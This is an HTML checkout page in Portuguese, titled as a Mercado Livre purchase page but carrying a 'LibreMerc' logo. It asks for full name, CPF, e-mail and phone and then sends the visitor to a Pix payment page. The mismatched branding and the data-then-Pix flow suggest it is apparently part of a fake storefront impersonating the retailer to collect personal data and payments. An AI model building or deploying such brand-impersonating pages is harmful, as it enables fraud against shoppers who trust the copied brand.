<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Finalizar Compra | Mercado Livre</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body class="cep-page">
  <a href="index.html" class="logo-link">
    <img src="assets/logo-1.png" alt="Logo LibreMerc" class="logo" />
  </a>

  <div class="cep-container">
    <h2>Preencha seus dados para a nota fiscal</h2>
    <form action="pix.html" method="GET">
      <label for="nome">Nome completo:</label>
      <input type="text" id="nome" required />

      <label for="cpf">CPF:</label>
      <input type="text" id="cpf" required />

      <label for="email">E-mail:</label>
      <input type="text" id="email" required />

      <label for="telefone">Telefone:</label>
      <input type="text" id="telefone" required />

      <button type="submit">Ir para pagamento</button>
    </form>
  </div>
</body>
</html>
